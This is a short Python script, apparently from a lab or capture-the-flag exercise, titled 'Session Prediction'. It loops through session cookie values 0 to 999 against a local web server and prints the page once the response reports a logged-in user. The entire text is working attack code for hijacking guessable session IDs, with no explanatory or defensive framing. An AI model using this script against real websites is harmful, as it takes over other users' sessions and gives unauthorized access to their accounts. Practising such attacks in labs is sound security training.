# Session Prediction
import requests

url = 'http://127.0.0.1:80/'

for i in range(1000):
    try:
        r = requests.get(url, cookies={"session": str(i)})
        r.raise_for_status()

        if "user is logged in!" in r.text:
            print(r.text)
            break
    except:
        pass

